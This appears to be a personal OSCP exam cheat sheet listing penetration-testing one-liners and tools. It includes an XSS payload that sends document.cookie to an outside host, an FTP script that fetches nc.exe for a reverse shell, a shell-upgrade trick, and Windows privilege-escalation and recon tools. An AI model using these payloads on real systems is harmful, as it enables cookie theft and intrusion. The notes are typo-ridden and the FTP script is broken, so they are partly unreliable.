# OSCP NOTES

● <script>new image().src="http://ip:port/bogus.php?output="+escape(document.cookie);</script>
● netstat -ntl >> list open port
● wappalyzer >> webpage programming lange ,service{apache,lls}, OS
● <dirb> <gobaster> :: fuzzing directuries >> wfuzz 
   wfuzz -c -z file,wordlist directiry --hc 404,302,301 url/fuzz.(php,txt,zip,sh........)

○ python -c 'import pty; pty.spawn("/bin/bash")'
   Ctrl +z 》 process to background 
   Stay raw -echo
   fg
   By this way you take interactive shell

○ reverse shell by FTB
    echo open ip >ftp.txt
    echo user limbo >ftp.txt
    echo pass >ftp.txt
    echo bin >ftp.txt
    echo GET nc.exe> ftp.txt
    echo bye>ftp.txt
 Ftp -v -n -s:ftp.txt

#automation enumeration

○ windows privesc check >> check system misconfiguration
○ watson >> .net app : find KBs(knownlege base) >> check patchs, updates
○ sherlok >> like wayson in powershell script
○ powerup >> token - services - dll hijacking - registery
○ windows exploit suggester >> patchs vs microsost vuln db
○ WinPEAS exe bat

--------------------------------------------------------------------------------------
wafwoof - nmap script >> for detect waf
wget -r / httrack url >> dowload website for offline scanning
whatweb >> info about website
whois >> info about domains / registeration







  
